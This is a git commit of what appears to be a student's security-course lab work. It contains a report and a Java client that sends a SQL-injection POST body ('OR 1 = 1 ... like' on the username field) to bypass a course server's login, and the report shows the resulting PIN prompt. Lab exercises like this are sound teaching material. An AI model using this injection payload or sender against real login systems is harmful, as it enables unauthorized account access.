039204a903dce4623d1f75e6708850dc01e62f5f
Jakub Moravec <jakub.moravec@profinit.eu>
2017-11-02 14:03:47 +0100

    init

---
+++ report.md
@@ -0,0 +1,9 @@
+#REPORT - moravja8
+
+
+## Prolomení login screen a zijštění username
+POST body: "username= ' OR 1 = 1 AND username like '%moravja8%' OR '&password="
+RESPONSE:
+{% raw %}
+    <pre><code><h2>Welcome <font color="green">rux6j_moravja8</font>, enter your four digit PIN number</h2><form id="pin" action="index.php" method="post"><input type="text" maxlength="4" name="pin" placeholder="_ _ _ _" required ><input type="submit" value="Verify"></form><a id="logout" href="index.php?logout">Logout</a></code></pre>
+{% endraw %}
---
+++ src/main/java/Main.java
@@ -0,0 +1,98 @@
+import javax.net.ssl.HttpsURLConnection;
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+/**
+ * Created by jmoravec on 02.11.2017.
+ */
+public class Main {
+
+    private final String USER_AGENT = "Mozilla/5.0";
+    private static final String APP_URL = "https://kbe.felk.cvut.cz/";
+
+    public static void main(String[] args) throws Exception {
+        Main main = new Main();
+
+        // crack login screen
+        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username like '%moravja8%' OR '&password=");
+
+    }
+
+
+    // HTTP POST request
+    private void sendPost(String url, String body) throws Exception {
+
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+
+        //add reuqest header
+        con.setRequestMethod("POST");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
+
+        // Send post request
+        con.setDoOutput(true);
+        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
+        wr.writeBytes(body);
+        wr.flush();
+        wr.close();
+
+        int responseCode = con.getResponseCode();
+        System.out.println("\nSending 'POST' request to URL : " + url);
+        System.out.println("Post parameters : " + body);
+        System.out.println("Response Code : " + responseCode);
+
+        BufferedReader in = new BufferedReader(
+                new InputStreamReader(con.getInputStream()));
+        String inputLine;
+        StringBuffer response = new StringBuffer();
+
+        while ((inputLine = in.readLine()) != null) {
+            response.append(inputLine);
+        }
+        in.close();
+
+        //print result
+        System.out.println(response.toString());
+
+    }
+
+
+
+    // HTTP GET request
+    private void sendGet() throws Exception {
+
+        String url = "http://www.google.com/search?q=mkyong";
+
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+
+        // optional default is GET
+        con.setRequestMethod("GET");
+
+        //add request header
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        System.out.println("\nSending 'GET' request to URL : " + url);
+        System.out.println("Response Code : " + responseCode);
+
+        BufferedReader in = new BufferedReader(
+                new InputStreamReader(con.getInputStream()));
+        String inputLine;
+        StringBuffer response = new StringBuffer();
+
+        while ((inputLine = in.readLine()) != null) {
+            response.append(inputLine);
+        }
+        in.close();
+
+        //print result
+        System.out.println(response.toString());
+
+    }
+
+}
